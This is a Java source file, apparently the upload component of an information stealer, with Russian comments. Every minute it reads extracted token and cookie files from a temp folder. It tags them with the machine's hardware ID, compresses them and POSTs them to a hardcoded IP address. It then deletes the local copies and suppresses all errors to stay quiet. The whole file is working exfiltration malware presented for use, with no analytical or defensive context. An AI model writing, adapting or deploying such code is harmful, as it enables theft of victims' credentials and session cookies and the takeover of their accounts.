import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;
import java.util.concurrent.*;

public class AggregatorSender {
    private static final String EXTRACTED_DIR = System.getenv("TEMP") + "\\SWILL_DEC\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891";
    private static final String HWID = getHWID();
    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    private static final Set<String> sentHashes = ConcurrentHashMap.newKeySet();
    
    public static void main(String[] args) {
        scheduler.scheduleAtFixedRate(() -> {
            try {
                processAndSend();
            } catch (Exception e) {}
        }, 10, 60, TimeUnit.SECONDS); // каждую минуту, без нагрузки
    }
    
    private static void processAndSend() {
        File extractedDir = new File(EXTRACTED_DIR);
        if (!extractedDir.exists()) return;
        
        File[] files = extractedDir.listFiles();
        if (files == null) return;
        
        for (File f : files) {
            String hash = getFileHash(f);
            if (sentHashes.contains(hash)) continue;
            
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                if (content.trim().isEmpty()) continue;
                
                // Отправляем без нагрузки: задержка, малый размер пакетов
                Thread.sleep(200 + (int)(Math.random() * 300));
                sendData(f.getName(), content);
                
                sentHashes.add(hash);
                
                // Удаляем отправленный файл, чтобы не накапливать
                f.delete();
            } catch (Exception e) {}
        }
    }
    
    private static void sendData(String filename, String data) {
        HttpURLConnection conn = null;
        try {
            String urlStr;
            if (filename.contains("tokens")) {
                urlStr = SERVER_URL + "/upload_tokens";
            } else {
                urlStr = SERVER_URL + "/upload_cookies";
            }
            
            String payload = "HWID: " + HWID + "\nFILE: " + filename + "\n" + data;
            
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);
            
            // Сжатие для уменьшения нагрузки
            byte[] compressed = compress(payload);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            if (code == 200) {
                System.out.println("[Aggregator] Sent: " + filename);
            }
        } catch (Exception e) {
            // Молчание — без логов, не нагружать
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static byte[] compress(String str) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(bos);
        gzip.write(str.getBytes());
        gzip.close();
        return bos.toByteArray();
    }
    
    private static String getFileHash(File f) {
        try (InputStream in = new FileInputStream(f)) {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) != -1) md.update(buffer, 0, read);
            return Base64.getEncoder().encodeToString(md.digest());
        } catch (Exception e) { return ""; }
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) return line.trim();
            }
        } catch (Exception e) {}
        return "UNKNOWN";
    }
}